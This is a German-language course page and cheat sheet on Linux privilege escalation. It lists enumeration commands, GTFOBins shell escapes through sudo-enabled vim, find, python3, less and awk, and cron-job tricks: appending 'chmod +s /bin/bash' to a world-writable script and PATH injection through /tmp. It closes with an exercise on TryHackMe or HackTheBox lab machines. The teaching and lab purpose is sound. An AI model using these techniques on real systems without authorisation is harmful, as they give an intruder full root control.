Privilege Escalation — Linux

Cheat Sheets
bash linux
Lernziele
  • SUID/SGID-Binaries für Privilege Escalation identifizieren
  • Sudo-Fehlkonfigurationen ausnutzen (sudo -l)
  • Cron-Jobs als Privilege-Escalation-Vektor analysieren
  • World-writable Scripts und Pfad-Injection nutzen
  • GTFOBins für bekannte Binary-Exploits nutzen
Hintergrund

Privilege Escalation (PrivEsc) ist der Schritt von einem normalen User-Account zu root. Nach dem initialen Zugriff (meist als low-privilege User) ist PrivEsc das Ziel um vollständige Kontrolle zu erlangen.

GTFOBins (gtfobins.github.io) ist die wichtigste Ressource für Linux PrivEsc: es dokumentiert wie Unix-Standard-Binaries für Escalation missbraucht werden können — wenn sie als SUID oder via sudo ausführbar sind.

Schlüsselkonzepte

Manuelle Enumeration

Code anzeigen
# System-Info
uname -a && whoami && id
cat /etc/os-release

# SUID-Binaries (laufen als Owner, meist root)
find / -perm -4000 -type f 2>/dev/null

# Sudo-Rechte
sudo -l

# Cron-Jobs
cat /etc/crontab
ls -la /etc/cron.*
cat /var/spool/cron/crontabs/* 2>/dev/null

# World-writable Files
find / -writable -type f 2>/dev/null | grep -v proc

# Netzwerk-Ports (interne Dienste)
ss -tlnp
netstat -tlnp

GTFOBins Beispiele

Code anzeigen
# Wenn "vim" als SUID konfiguriert:
vim -c '!bash'

# Wenn sudo NOEPASSWD für find:
sudo find / -exec /bin/bash \;

# Wenn sudo für python3:
sudo python3 -c 'import os; os.system("/bin/bash")'

# Wenn sudo für less:
sudo less /etc/passwd
!bash

# Wenn sudo für awk:
sudo awk 'BEGIN {system("/bin/bash")}'

# GTFOBins: https://gtfobins.github.io/

Cron-Job-Exploitation

Code anzeigen
# Verwundbare Konfiguration:
# /etc/crontab:
# * * * * * root /opt/backup.sh

# Wenn /opt/backup.sh world-writable:
echo "chmod +s /bin/bash" >> /opt/backup.sh
# Warten bis Cron ausführt
# Dann:
bash -p   # SUID-Bash → root Shell

# Alternativ: PATH-Injection
# Wenn cron PATH=/tmp:... und Script sucht "python"
echo "chmod +s /bin/bash" > /tmp/python
chmod +x /tmp/python
Aufgabe

Führe Linux PrivEsc auf einer TryHackMe- oder HackTheBox-Maschine durch (z.B. "Linux PrivEsc" Room auf THM). Nutze mindestens zwei verschiedene Techniken und dokumentiere jeden Schritt.

Anforderungen
  1. Initialer Zugriff als low-privilege User
  2. Enumeration durchgeführt (SUID, sudo, cron, writable)
  3. Mindestens eine PrivEsc-Technik erfolgreich
  4. Root-Proof (id oder /root/root.txt)
Akzeptanzkriterien
  • id nach PrivEsc zeigt uid=0 (root)
  • Alle Schritte reproduzierbar dokumentiert
  • GTFOBins-Eintrag für genutzte Technik zitiert
